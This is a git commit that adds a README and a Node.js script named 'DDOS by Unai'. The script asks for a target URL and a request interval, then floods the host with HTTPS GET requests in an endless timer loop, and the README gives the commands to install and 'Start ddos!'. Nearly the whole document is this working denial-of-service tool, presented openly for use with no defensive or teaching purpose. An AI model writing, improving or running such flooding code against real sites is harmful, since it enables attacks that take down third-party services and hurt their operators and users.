5cd05efc011662a77e7e908e54f665da939a4d71
unaiiM <77381425+unaiiM@users.noreply.github.com>
2021-01-13 11:20:23 +0100

    Add files via upload

---
+++ README.txt
@@ -0,0 +1,7 @@
+------------------------------
+	Installation
+------------------------------
+1.Install requeriments:
+	$sudo bash requeriments.sh
+2.Start ddos! :
+ 	$node ddos.js
---
+++ ddos.js
@@ -0,0 +1,42 @@
+const readline = require("readline");
+const rl = readline.createInterface({
+	    input: process.stdin,
+	    output: process.stdout
+});
+const https = require("https");
+let requests = 0;
+let imprimir = 10;
+let msg = `
+------------------------------
+	DDOS by Unai
+------------------------------
+`
+let down = false;
+function ddos(url_, intensidad){
+	let interval = setInterval(function(){
+		var options = {
+			hostname: url_,
+			method: 'GET'
+		}
+		const req = https.request(options, res => {
+			requests++;
+			if(requests === imprimir){
+				console.log(`(${imprimir}) Requests send it! Status: ${res.statusCode}`);
+	        		imprimir = imprimir + 10;
+			}
+		})
+		req.on('error', error => {
+		        console.log("An error ocurred: ");
+			console.error(error);
+	        })
+		req.end()
+	}, intensidad)
+}
+
+console.log(msg);
+rl.question("Url: ", function(url){
+	console.log(`Starting ddos to ${url}`);
+	rl.question("Intensidad: ", function(intensidad){
+		ddos(url, intensidad);
+	})
+})
